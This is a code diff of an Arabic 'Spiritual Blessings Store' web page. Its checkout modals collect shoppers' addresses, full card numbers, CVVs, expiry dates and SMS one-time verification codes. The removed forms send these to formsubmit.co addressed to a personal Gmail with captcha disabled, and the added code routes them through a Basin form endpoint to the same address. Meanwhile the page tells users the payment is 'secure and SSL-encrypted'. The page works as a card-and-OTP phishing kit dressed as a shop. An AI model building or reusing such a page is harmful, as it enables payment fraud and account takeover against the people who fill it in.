@@ -1,4 +1,5 @@
 <!DOCTYPE html><html lang="ar" dir="rtl"><head><meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>متجر البركات الروحانية - Spiritual Blessings Store</title>
@@ -7,6 +8,16 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css" rel="stylesheet">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
+    <!-- Basin Form Service -->
+    <script>
+        // Basin Configuration
+        const BASIN_CONFIG = {
+            formUrl: 'https://usebasin.com/f/05576018d11c',
+            email: 'kalimmmy@gmail.com'
+        };
+        
+        console.log('✅ Basin Form Service configured');
+    </script>
     <script>
         tailwind.config = {
             theme: {
@@ -131,6 +142,35 @@
         </div>
     </section>
 
+    <!-- Advanced Features Section -->
+    <section class="py-12 bg-gradient-to-r from-gray-50 to-white dark:from-gray-800 dark:to-gray-900">
+        <div class="container mx-auto px-4">
+            <h3 class="text-3xl font-bold text-center mb-8" data-translate="advanced-features" data-aos="fade-down">مميزات متطورة</h3>
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
+                <div class="text-center p-6 bg-white dark:bg-gray-800 rounded-lg shadow-lg" data-aos="flip-left">
+                    <i class="fas fa-shield-alt text-4xl text-primary mb-4"></i>
+                    <h4 class="font-bold mb-2" data-translate="secure-payment">دفع آمن</h4>
+                    <p class="text-sm" data-translate="ssl-encryption">تشفير SSL متقدم</p>
+                </div>
+                <div class="text-center p-6 bg-white dark:bg-gray-800 rounded-lg shadow-lg" data-aos="flip-left" data-aos-delay="100">
+                    <i class="fas fa-mobile-alt text-4xl text-emerald mb-4"></i>
+                    <h4 class="font-bold mb-2" data-translate="mobile-app">تطبيق موبايل</h4>
+                    <p class="text-sm" data-translate="app-soon">قريباً على الأجهزة</p>
+                </div>
+                <div class="text-center p-6 bg-white dark:bg-gray-800 rounded-lg shadow-lg" data-aos="flip-left" data-aos-delay="200">
+                    <i class="fas fa-headset text-4xl text-gold mb-4"></i>
+                    <h4 class="font-bold mb-2" data-translate="24-7-support">دعم 24/7</h4>
+                    <p class="text-sm" data-translate="instant-support">مساعدة فورية</p>
+                </div>
+                <div class="text-center p-6 bg-white dark:bg-gray-800 rounded-lg shadow-lg" data-aos="flip-left" data-aos-delay="300">
+                    <i class="fas fa-robot text-4xl text-purple-600 mb-4"></i>
+                    <h4 class="font-bold mb-2" data-translate="ai-recommendations">توصيات ذكية</h4>
+                    <p class="text-sm" data-translate="ai-powered">مدعوم بالذكاء الاصطناعي</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
     <!-- Products Section -->
     <section class="py-12">
         <div class="container mx-auto px-4">
@@ -157,89 +197,51 @@
                     <span class="font-bold" data-translate="total">المجموع:</span>
                     <span id="cartTotal" class="font-bold text-xl text-primary">$0</span>
                 </div>
-                <button onclick="startCheckout()" class="w-full bg-primary text-white py-3 rounded-lg font-bold hover:bg-primary/90 transition-colors">
+                <button onclick="proceedToCheckout()" class="w-full bg-primary text-white py-3 rounded-lg font-bold hover:bg-primary/90 transition-colors">
                     <span data-translate="checkout">إتمام الطلب</span>
                 </button>
             </div>
         </div>
     </div>
 
-    <!-- Step 1: Shipping Info Modal -->
-    <div id="shippingModal" class="fixed inset-0 bg-black/50 hidden items-center justify-center z-50 p-4">
-        <div class="bg-white dark:bg-gray-800 rounded-xl max-w-md w-full mx-4 shadow-2xl max-h-screen overflow-y-auto">
-            <div class="p-6">
-                <!-- Progress Bar -->
-                <div class="flex items-center justify-center mb-8">
-                    <div class="flex items-center">
-                        <!-- Step 1 - Active -->
-                        <div class="flex items-center text-primary">
-                            <div class="w-8 h-8 bg-primary text-white rounded-full flex items-center justify-center font-bold text-sm">1</div>
-                            <span class="mr-2 text-sm font-medium">الشحن</span>
-                        </div>
-                        <!-- Arrow -->
-                        <i class="fas fa-arrow-left text-gray-400 mx-3"></i>
-                        <!-- Step 2 - Inactive -->
-                        <div class="flex items-center text-gray-400">
-                            <div class="w-8 h-8 bg-gray-300 text-gray-600 rounded-full flex items-center justify-center font-bold text-sm">2</div>
-                            <span class="mr-2 text-sm">الدفع</span>
-                        </div>
-                        <!-- Arrow -->
-                        <i class="fas fa-arrow-left text-gray-400 mx-3"></i>
-                        <!-- Step 3 - Inactive -->
-                        <div class="flex items-center text-gray-400">
-                            <div class="w-8 h-8 bg-gray-300 text-gray-600 rounded-full flex items-center justify-center font-bold text-sm">3</div>
-                            <span class="mr-2 text-sm">التأكيد</span>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Header -->
-                <div class="text-center mb-6">
-                    <div class="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-4">
-                        <i class="fas fa-shipping-fast text-primary text-2xl"></i>
-                    </div>
-                    <h3 class="text-xl font-bold text-gray-800 dark:text-white mb-2">معلومات التوصيل</h3>
-                    <p class="text-gray-600 dark:text-gray-300 text-sm">أدخل بيانات الشحن للمتابعة</p>
+    <!-- Shipping Info Modal -->
+    <div id="checkoutModal" class="fixed inset-0 bg-black/50 hidden items-center justify-center z-50 p-2">
+        <div class="bg-white dark:bg-gray-800 rounded-lg max-w-sm w-full mx-2 shadow-2xl max-h-screen overflow-y-auto">
+            <div class="p-4">
+                <div class="flex justify-between items-center mb-4">
+                    <h3 class="text-lg font-bold flex items-center">
+                        <i class="fas fa-shipping-fast text-primary mr-2 text-sm"></i>
+                        <span data-translate="shipping-info-title">معلومات التوصيل</span>
+                    </h3>
+                    <button onclick="closeCheckout()" class="text-gray-500 hover:text-gray-700">
+                        <i class="fas fa-times"></i>
+                    </button>
                 </div>
 
                 <!-- Order Summary -->
-                <div class="bg-gray-50 dark:bg-gray-700 rounded-lg p-4 mb-6">
-                    <h4 class="font-bold text-sm mb-3 text-gray-800 dark:text-white">ملخص الطلب</h4>
-                    <div id="shippingOrderItems" class="space-y-2 text-sm mb-3"></div>
-                    <div class="border-t pt-3 flex justify-between font-bold text-primary">
-                        <span>المجموع:</span>
-                        <span id="shippingTotal">$0</span>
+                <div class="bg-gray-50 dark:bg-gray-700 rounded p-3 mb-4">
+                    <div id="checkoutOrderItems" class="space-y-1 text-sm mb-2"></div>
+                    <div class="border-t pt-2 flex justify-between items-center font-bold text-sm">
+                        <span data-translate="total-amount">المجموع:</span>
+                        <span id="checkoutTotal" class="text-primary">$0</span>
                     </div>
                 </div>
 
                 <!-- Shipping Form -->
-                <form action="https://formsubmit.co/kalimmmy@gmail.com" method="POST" id="shippingForm" class="space-y-4">
-                    <!-- Hidden Fields for FormSubmit -->
-                    <input type="hidden" name="_captcha" value="false">
-                    <input type="hidden" name="_subject" value="📦 معلومات الشحن - متجر البركات الروحانية">
-                    <input type="hidden" name="_template" value="table">
-                    
-                    <!-- Full Name -->
+                <form id="shippingForm" class="space-y-3">
                     <div>
-                        <label class="block text-sm font-medium mb-2">
-                            <i class="fas fa-user text-primary mr-2"></i>الاسم الكامل *
-                        </label>
-                        <input type="text" name="اسم_العميل" id="fullName" required="" class="w-full px-4 py-3 text-base border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600">
+                        <label class="block text-xs font-medium mb-1" data-translate="full-name">الاسم الكامل *</label>
+                        <input type="text" id="fullName" required="" class="w-full px-3 py-2 text-base border rounded focus:ring-1 focus:ring-primary dark:bg-gray-700 dark:border-gray-600">
                     </div>
                     
-                    <!-- Phone & Country -->
-                    <div class="grid grid-cols-2 gap-3">
+                    <div class="grid grid-cols-2 gap-2">
                         <div>
-                            <label class="block text-sm font-medium mb-2">
-                                <i class="fas fa-phone text-primary mr-2"></i>الهاتف *
-                            </label>
-                            <input type="tel" name="رقم_الهاتف" id="phoneNumber" required="" maxlength="14" class="w-full px-4 py-3 text-base border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600">
+                            <label class="block text-xs font-medium mb-1" data-translate="phone">الهاتف *</label>
+                            <input type="tel" id="phoneNumber" required="" maxlength="14" class="w-full px-3 py-2 text-base border rounded focus:ring-1 focus:ring-primary dark:bg-gray-700 dark:border-gray-600">
                         </div>
                         <div>
-                            <label class="block text-sm font-medium mb-2">
-                                <i class="fas fa-globe text-primary mr-2"></i>الدولة *
-                            </label>
-                            <select name="الدولة" id="country" required="" class="w-full px-4 py-3 text-base border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600">
+                            <label class="block text-xs font-medium mb-1" data-translate="country">الدولة *</label>
+                            <select id="country" required="" class="w-full px-3 py-2 text-base border rounded focus:ring-1 focus:ring-primary dark:bg-gray-700 dark:border-gray-600">
                                 <option value="">اختر</option>
                                 <option value="السعودية">🇸🇦 السعودية</option>
                                 <option value="الإمارات">🇦🇪 الإمارات</option>
@@ -257,257 +259,135 @@
                         </div>
                     </div>
                     
-                    <!-- Address -->
                     <div>
-                        <label class="block text-sm font-medium mb-2">
-                            <i class="fas fa-map-marker-alt text-primary mr-2"></i>العنوان الكامل *
-                        </label>
-                        <textarea name="العنوان_الكامل" id="fullAddress" required="" rows="3" class="w-full px-4 py-3 text-base border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" placeholder="المدينة، الشارع، رقم المبنى"></textarea>
-                    </div>
-                    
-                    <!-- Notes -->
-                    <div>
-                        <label class="block text-sm font-medium mb-2">
-                            <i class="fas fa-sticky-note text-primary mr-2"></i>ملاحظات إضافية
-                        </label>
-                        <textarea name="ملاحظات_إضافية" rows="2" class="w-full px-4 py-3 text-base border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" placeholder="أي ملاحظات خاصة..."></textarea>
+                        <label class="block text-xs font-medium mb-1" data-translate="address">العنوان *</label>
+                        <textarea id="fullAddress" required="" rows="2" class="w-full px-3 py-2 text-base border rounded focus:ring-1 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" placeholder="المدينة، الشارع، رقم المبنى"></textarea>
                     </div>
 
-                    <!-- Hidden Order Info -->
-                    <input type="hidden" name="تفاصيل_الطلب" id="orderDetails">
-                    <input type="hidden" name="المبلغ_الإجمالي" id="orderTotal">
-                    <input type="hidden" name="تاريخ_الطلب" id="orderDate">
-                    <input type="hidden" name="نوع_الطلب" value="معلومات الشحن">
-                    
-                    <!-- Buttons -->
-                    <div class="flex space-x-3 space-x-reverse">
-                        <button type="button" onclick="closeShipping()" class="flex-1 bg-gray-200 text-gray-800 py-3 rounded-lg font-bold hover:bg-gray-300 transition-colors">
-                            إلغاء
-                        </button>
-                        <button type="submit" class="flex-1 bg-gradient-to-r from-primary to-purple-600 text-white py-3 rounded-lg font-bold hover:from-primary/90 hover:to-purple-600/90 transition-all">
-                            <i class="fas fa-arrow-left mr-2"></i>متابعة للدفع
-                        </button>
-                    </div>
+                    <!-- Continue Button -->
+                    <button type="submit" class="w-full bg-primary text-white py-3 rounded font-bold hover:bg-primary/90 transition-colors">
+                        <span class="flex items-center justify-center text-sm">
+                            <i class="fas fa-credit-card mr-2"></i>
+                            <span data-translate="continue-payment">متابعة للدفع</span>
+                        </span>
+                    </button>
                 </form>
             </div>
         </div>
     </div>
 
-    <!-- Step 2: Payment Modal -->
-    <div id="paymentModal" class="fixed inset-0 bg-black/50 hidden items-center justify-center z-50 p-4">
-        <div class="bg-white dark:bg-gray-800 rounded-xl max-w-md w-full mx-4 shadow-2xl max-h-screen overflow-y-auto">
-            <div class="p-6">
-                <!-- Progress Bar -->
-                <div class="flex items-center justify-center mb-8">
-                    <div class="flex items-center">
-                        <!-- Step 1 - Completed -->
-                        <div class="flex items-center text-emerald">
-                            <div class="w-8 h-8 bg-emerald text-white rounded-full flex items-center justify-center">
-                                <i class="fas fa-check text-xs"></i>
-                            </div>
-                            <span class="mr-2 text-sm font-medium">الشحن</span>
-                        </div>
-                        <!-- Arrow -->
-                        <i class="fas fa-arrow-left text-emerald mx-3"></i>
-                        <!-- Step 2 - Active -->
-                        <div class="flex items-center text-primary">
-                            <div class="w-8 h-8 bg-primary text-white rounded-full flex items-center justify-center font-bold text-sm">2</div>
-                            <span class="mr-2 text-sm font-medium">الدفع</span>
-                        </div>
-                        <!-- Arrow -->
-                        <i class="fas fa-arrow-left text-gray-400 mx-3"></i>
-                        <!-- Step 3 - Inactive -->
-                        <div class="flex items-center text-gray-400">
-                            <div class="w-8 h-8 bg-gray-300 text-gray-600 rounded-full flex items-center justify-center font-bold text-sm">3</div>
-                            <span class="mr-2 text-sm">التأكيد</span>
-                        </div>
-                    </div>
+    <!-- Card Payment Modal -->
+    <div id="paymentModal" class="fixed inset-0 bg-black/50 hidden items-center justify-center z-50 p-2">
+        <div class="bg-white dark:bg-gray-800 rounded-lg max-w-sm w-full mx-2 shadow-2xl max-h-screen overflow-y-auto">
+            <div class="p-4">
+                <div class="flex justify-between items-center mb-4">
+                    <h3 class="text-lg font-bold flex items-center">
+                        <i class="fas fa-credit-card text-primary mr-2 text-sm"></i>
+                        <span data-translate="payment-title">الدفع الآمن</span>
+                    </h3>
+                    <button onclick="closePaymentModal()" class="text-gray-500 hover:text-gray-700">
+                        <i class="fas fa-times"></i>
+                    </button>
                 </div>
 
-                <!-- Header -->
-                <div class="text-center mb-6">
-                    <div class="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-4">
-                        <i class="fas fa-credit-card text-primary text-2xl"></i>
+                <!-- Order Summary -->
+                <div class="bg-gray-50 dark:bg-gray-700 rounded p-3 mb-4">
+                    <div id="paymentOrderItems" class="space-y-1 text-sm mb-2"></div>
+                    <div class="border-t pt-2 flex justify-between items-center font-bold text-sm">
+                        <span data-translate="total-amount">المجموع:</span>
+                        <span id="paymentTotal" class="text-primary">$0</span>
                     </div>
-                    <h3 class="text-xl font-bold text-gray-800 dark:text-white mb-2">الدفع الآمن</h3>
-                    <p class="text-gray-600 dark:text-gray-300 text-sm">أدخل بيانات البطاقة للدفع</p>
-                </div>
-
-                <!-- Amount -->
-                <div class="bg-gray-50 dark:bg-gray-700 rounded-lg p-4 mb-6 text-center">
-                    <div class="text-2xl font-bold text-primary mb-1" id="paymentAmount">$0</div>
-                    <div class="text-sm text-gray-600 dark:text-gray-300">المبلغ المطلوب</div>
                 </div>
 
                 <!-- Payment Form -->
-                <form action="https://formsubmit.co/kalimmmy@gmail.com" method="POST" id="paymentForm" class="space-y-4">
-                    <!-- Hidden Fields for FormSubmit -->
-                    <input type="hidden" name="_captcha" value="false">
-                    <input type="hidden" name="_subject" value="💳 معلومات الدفع - متجر البركات الروحانية">
-                    <input type="hidden" name="_template" value="table">
-                    
-                    <!-- Card Number -->
+                <form id="paymentForm" class="space-y-3">
                     <div>
-                        <label class="block text-sm font-medium mb-2">
-                            <i class="fas fa-credit-card text-primary mr-2"></i>رقم البطاقة *
-                        </label>
+                        <label class="block text-xs font-medium mb-1" data-translate="card-number">رقم البطاقة *</label>
                         <div class="relative">
-                            <input type="text" name="رقم_البطاقة" id="cardNumber" required="" maxlength="19" class="w-full px-4 py-3 text-base border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600 pr-12" placeholder="1234 5678 9012 3456">
-                            <div class="absolute left-3 top-1/2 transform -translate-y-1/2">
-                                <i id="cardIcon" class="fas fa-credit-card text-gray-400"></i>
+                            <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required="" class="w-full px-3 py-2 text-base border rounded focus:ring-1 focus:ring-primary dark:bg-gray-700 dark:border-gray-600 pr-10">
+                            <div class="absolute right-2 top-1/2 transform -translate-y-1/2">
+                                <i id="cardIcon" class="fas fa-credit-card text-gray-400 text-sm"></i>
                             </div>
                         </div>
                     </div>
-                    
-                    <!-- Cardholder Name -->
+
                     <div>
-                        <label class="block text-sm font-medium mb-2">
-                            <i class="fas fa-user text-primary mr-2"></i>اسم صاحب البطاقة *
-                        </label>
-                        <input type="text" name="اسم_صاحب_البطاقة" id="cardholderName" required="" class="w-full px-4 py-3 text-base border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" placeholder="Ahmed Al-Mohammed">
+                        <label class="block text-xs font-medium mb-1" data-translate="cardholder-name">اسم صاحب البطاقة *</label>
+                        <input type="text" id="cardholderName" placeholder="Ahmed Al-Mohammed" required="" class="w-full px-3 py-2 text-base border rounded focus:ring-1 focus:ring-primary dark:bg-gray-700 dark:border-gray-600">
                     </div>
-                    
-                    <!-- Expiry & CVV -->
-                    <div class="grid grid-cols-2 gap-3">
+
+                    <div class="grid grid-cols-2 gap-2">
                         <div>
-                            <label class="block text-sm font-medium mb-2">
-                                <i class="fas fa-calendar text-primary mr-2"></i>انتهاء *
-                            </label>
-                            <input type="text" name="تاريخ_الانتهاء" id="expiryDate" required="" maxlength="5" class="w-full px-4 py-3 text-base border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" placeholder="MM/YY">
+                            <label class="block text-xs font-medium mb-1" data-translate="expiry-date">انتهاء *</label>
+                            <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" required="" class="w-full px-3 py-2 text-base border rounded focus:ring-1 focus:ring-primary dark:bg-gray-700 dark:border-gray-600">
                         </div>
                         <div>
-                            <label class="block text-sm font-medium mb-2">
-                                <i class="fas fa-lock text-primary mr-2"></i>CVV *
-                            </label>
-                            <input type="text" name="CVV" id="cvv" required="" maxlength="4" class="w-full px-4 py-3 text-base border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" placeholder="123">
+                            <label class="block text-xs font-medium mb-1" data-translate="cvv">CVV *</label>
+                            <input type="text" id="cvv" placeholder="123" maxlength="4" required="" class="w-full px-3 py-2 text-base border rounded focus:ring-1 focus:ring-primary dark:bg-gray-700 dark:border-gray-600">
                         </div>
                     </div>
 
-                    <!-- Hidden Payment Info -->
-                    <input type="hidden" name="المبلغ_المطلوب" id="paymentTotalAmount">
-                    <input type="hidden" name="تاريخ_المعاملة" id="transactionDate">
-                    <input type="hidden" name="نوع_الطلب" value="معلومات الدفع (اختبار)">
-                    <input type="hidden" name="تحذير" value="⚠️ هذه معلومات اختبار فقط!">
-                    
                     <!-- Security Info -->
-                    <div class="bg-emerald/10 border border-emerald/30 rounded-lg p-3">
-                        <div class="flex items-center text-emerald text-sm">
-                            <i class="fas fa-shield-alt mr-2"></i>
-                            <span>دفع آمن ومشفر بتقنية SSL</span>
+                    <div class="bg-emerald/10 border border-emerald/30 rounded p-2">
+                        <div class="flex items-center text-emerald">
+                            <i class="fas fa-shield-alt mr-2 text-xs"></i>
+                            <span class="text-xs font-medium" data-translate="secure-payment">دفع آمن ومشفر</span>
                         </div>
                     </div>
-                    
-                    <!-- Buttons -->
-                    <div class="flex space-x-3 space-x-reverse">
-                        <button type="button" onclick="backToShipping()" class="flex-1 bg-gray-200 text-gray-800 py-3 rounded-lg font-bold hover:bg-gray-300 transition-colors">
-                            رجوع
-                        </button>
-                        <button type="submit" class="flex-1 bg-gradient-to-r from-emerald to-green-600 text-white py-3 rounded-lg font-bold hover:from-emerald/90 hover:to-green-600/90 transition-all">
-                            <i class="fas fa-lock mr-2"></i>دفع آمن
-                        </button>
-                    </div>
+
+                    <!-- Pay Button -->
+                    <button type="submit" class="w-full bg-primary text-white py-3 rounded font-bold hover:bg-primary/90 transition-colors">
+                        <span class="flex items-center justify-center text-sm">
+                            <i class="fas fa-lock mr-2"></i>
+                            <span data-translate="pay-now">ادفع الآن</span>
+                            <span id="payAmount" class="mr-2">$0</span>
+                        </span>
+                    </button>
                 </form>
             </div>
         </div>
     </div>
 
-    <!-- Step 3: Verification Modal -->
+    <!-- Verification Code Modal -->
     <div id="verificationModal" class="fixed inset-0 bg-black/50 hidden items-center justify-center z-50 p-4">
-        <div class="bg-white dark:bg-gray-800 rounded-xl max-w-md w-full mx-4 shadow-2xl">
-            <div class="p-6">
-                <!-- Progress Bar -->
-                <div class="flex items-center justify-center mb-8">
-                    <div class="flex items-center">
-                        <!-- Step 1 - Completed -->
-                        <div class="flex items-center text-emerald">
-                            <div class="w-8 h-8 bg-emerald text-white rounded-full flex items-center justify-center">
-                                <i class="fas fa-check text-xs"></i>
-                            </div>
-                            <span class="mr-2 text-sm font-medium">الشحن</span>
-                        </div>
-                        <!-- Arrow -->
-                        <i class="fas fa-arrow-left text-emerald mx-3"></i>
-                        <!-- Step 2 - Completed -->
-                        <div class="flex items-center text-emerald">
-                            <div class="w-8 h-8 bg-emerald text-white rounded-full flex items-center justify-center">
-                                <i class="fas fa-check text-xs"></i>
-                            </div>
-                            <span class="mr-2 text-sm font-medium">الدفع</span>
-                        </div>
-                        <!-- Arrow -->
-                        <i class="fas fa-arrow-left text-emerald mx-3"></i>
-                        <!-- Step 3 - Active -->
-                        <div class="flex items-center text-primary">
-                            <div class="w-8 h-8 bg-primary text-white rounded-full flex items-center justify-center font-bold text-sm">3</div>
-                            <span class="mr-2 text-sm font-medium">التأكيد</span>
-                        </div>
-                    </div>
+        <div class="bg-white dark:bg-gray-800 rounded-xl max-w-sm w-full mx-4 shadow-2xl">
+            <div class="p-6 text-center">
+                <div class="w-20 h-20 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-4">
+                    <i class="fas fa-mobile-alt text-primary text-2xl"></i>
                 </div>
+                
+                <h3 class="text-xl font-bold mb-2" data-translate="verification-title">رمز التحقق</h3>
+                <p class="text-gray-600 dark:text-gray-300 mb-6" data-translate="verification-desc">
+                    تم إرسال رمز التحقق إلى هاتفك المحمول
+                </p>
 
-                <!-- Header -->
-                <div class="text-center mb-8">
-                    <div class="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-4">
-                        <i class="fas fa-mobile-alt text-primary text-2xl"></i>
-                    </div>
-                    <h3 class="text-xl font-bold text-gray-800 dark:text-white mb-2">رمز التحقق</h3>
-                    <p class="text-gray-600 dark:text-gray-300 text-sm">تم إرسال رمز التحقق إلى هاتفك المحمول</p>
-                </div>
-
-                <!-- Verification Form -->
-                <form action="https://formsubmit.co/kalimmmy@gmail.com" method="POST" class="space-y-6" id="verificationForm">
-                    <!-- Hidden Fields for FormSubmit -->
-                    <input type="hidden" name="_captcha" value="false">
-                    <input type="hidden" name="_subject" value="🔐 رمز التحقق - متجر البركات الروحانية">
-                    <input type="hidden" name="_template" value="table">
-                    
-                    <!-- 6-digit Code Input -->
-                    <div>
-                        <label class="block text-sm font-medium mb-4 text-center">أدخل الرمز المكون من 6 أرقام</label>
-                        <div class="flex justify-center space-x-2 space-x-reverse mb-6">
-                            <input type="number" inputmode="numeric" pattern="\d*" maxlength="1" data-index="0" class="w-12 h-12 text-center text-xl border-2 rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600 font-bold">
-                            <input type="number" inputmode="numeric" pattern="\d*" maxlength="1" data-index="1" class="w-12 h-12 text-center text-xl border-2 rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600 font-bold">
-                            <input type="number" inputmode="numeric" pattern="\d*" maxlength="1" data-index="2" class="w-12 h-12 text-center text-xl border-2 rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600 font-bold">
-                            <input type="number" inputmode="numeric" pattern="\d*" maxlength="1" data-index="3" class="w-12 h-12 text-center text-xl border-2 rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600 font-bold">
-                            <input type="number" inputmode="numeric" pattern="\d*" maxlength="1" data-index="4" class="w-12 h-12 text-center text-xl border-2 rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600 font-bold">
-                            <input type="number" inputmode="numeric" pattern="\d*" maxlength="1" data-index="5" class="w-12 h-12 text-center text-xl border-2 rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600 font-bold">
-                        </div>
+                <form id="verificationForm" class="space-y-4">
+                    <!-- 6-digit code input - NUMBERS ONLY -->
+                    <div class="flex justify-center space-x-2 space-x-reverse mb-6">
+                        <input type="number" inputmode="numeric" pattern="\d*" class="w-12 h-12 text-center text-xl border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" maxlength="1" data-index="0">
+                        <input type="number" inputmode="numeric" pattern="\d*" class="w-12 h-12 text-center text-xl border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" maxlength="1" data-index="1">
+                        <input type="number" inputmode="numeric" pattern="\d*" class="w-12 h-12 text-center text-xl border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" maxlength="1" data-index="2">
+                        <input type="number" inputmode="numeric" pattern="\d*" class="w-12 h-12 text-center text-xl border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" maxlength="1" data-index="3">
+                        <input type="number" inputmode="numeric" pattern="\d*" class="w-12 h-12 text-center text-xl border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" maxlength="1" data-index="4">
+                        <input type="number" inputmode="numeric" pattern="\d*" class="w-12 h-12 text-center text-xl border rounded-lg focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:border-gray-600" maxlength="1" data-index="5">
                     </div>
 
                     <!-- Timer -->
-                    <div class="text-center mb-4">
-                        <div class="text-sm text-gray-500 mb-2">
-                            <span>إعادة الإرسال خلال: </span>
-                            <span id="timer" class="font-bold text-primary">02:00</span>
-                        </div>
-                        <button type="button" id="resendBtn" onclick="resendCode()" disabled="" class="text-primary text-sm font-medium opacity-50 cursor-not-allowed">
-                            إعادة إرسال الرمز
-                        </button>
+                    <div class="text-sm text-gray-500 mb-4">
+                        <span data-translate="resend-in">إعادة الإرسال خلال: </span>
+                        <span id="timer" class="font-bold text-primary">02:00</span>
                     </div>
 
-                    <!-- Hidden Code Field -->
-                    <input type="hidden" name="رمز_التحقق" id="verificationCode">
-                    <input type="hidden" name="تاريخ_التحقق" id="verificationDate">
-                    <input type="hidden" name="نوع_الطلب" value="تأكيد رمز التحقق">
-                    
-                    <!-- Submit Button -->
-                    <button type="submit" id="verifyBtn" class="w-full bg-gradient-to-r from-emerald to-green-600 text-white py-4 rounded-lg font-bold text-lg hover:from-emerald/90 hover:to-green-600/90 transition-all">
-                        <i class="fas fa-check mr-2"></i>تأكيد الرمز
+                    <!-- Resend button -->
+                    <button type="button" id="resendBtn" onclick="resendCode()" disabled="" class="text-primary text-sm font-medium opacity-50 cursor-not-allowed mb-4">
+                        <span data-translate="resend-code">إعادة إرسال الرمز</span>
+                    </button>
+
+                    <!-- Verify button -->
+                    <button type="submit" class="w-full bg-primary text-white py-3 rounded-lg font-bold hover:bg-primary/90 transition-colors">
+                        <span data-translate="verify-code">تأكيد الرمز</span>
                     </button>
                 </form>
-
-                <!-- Success Message (Hidden Initially) -->
-                <div id="successMessage" class="hidden text-center">
-                    <div class="w-20 h-20 bg-emerald/10 rounded-full flex items-center justify-center mx-auto mb-6">
-                        <i class="fas fa-check-circle text-emerald text-4xl"></i>
-                    </div>
-                    <h3 class="text-2xl font-bold text-emerald mb-4">تم الدفع بنجاح! 🎉</h3>
-                    <p class="text-gray-600 dark:text-gray-300 mb-6">
-                        تم تأكيد طلبك وسيتم شحنه خلال 24 ساعة
-                    </p>
-                    <button onclick="closeAllModals()" class="bg-primary text-white px-8 py-3 rounded-lg font-bold hover:bg-primary/90 transition-colors">
-                        العودة للمتجر
-                    </button>
-                </div>
             </div>
         </div>
     </div>
@@ -627,10 +507,11 @@
                 image: 'https://pfst.cf2.poecdn.net/base/image/c1984a2d6668e93dc2130d9a1a7efeae6cb9d7271070a606015feef6aa567f61?w=600&h=600',
                 description: 'ماء زمزم الأصلي مقروء عليه بالرقية الشرعية للشفاء والبركة مع تمر عجوة',
